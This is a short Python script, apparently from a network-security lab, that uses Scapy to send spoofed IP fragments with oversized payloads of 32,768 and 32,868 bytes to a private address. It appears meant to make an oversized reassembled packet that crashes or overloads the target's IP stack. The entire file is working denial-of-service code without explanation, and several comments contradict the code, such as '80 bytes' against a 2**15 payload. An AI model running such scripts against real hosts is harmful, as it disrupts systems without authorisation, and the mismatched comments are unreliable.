#!/usr/bin/python3
from scapy.all import *
# Construct IP header
ip = IP(src="1.2.3.4", dst="10.0.2.5")
ip.id = 1000 # Identification
ip.frag = 0 # Offset of this IP fragment
ip.flags = 1 # Flags
# Construct UDP header
udp =UDP(sport=7070, dport=9090,len=655,chksum = 0)
# Construct payload
payload = 'A' * (2**15) # Put 80 bytes in the first fragment
# Construct the entire packet and send it out
pkt = ip/udp/payload # For other fragments, we should use ip/payload
send(pkt, verbose=0)
#The second fragment
ip = IP(src="1.2.3.4", dst="10.0.2.5")
ip.frag=4097
ip.flags=1
payload = 'B' * (2**15+100)
pkt=ip/payload
send(pkt, verbose=0)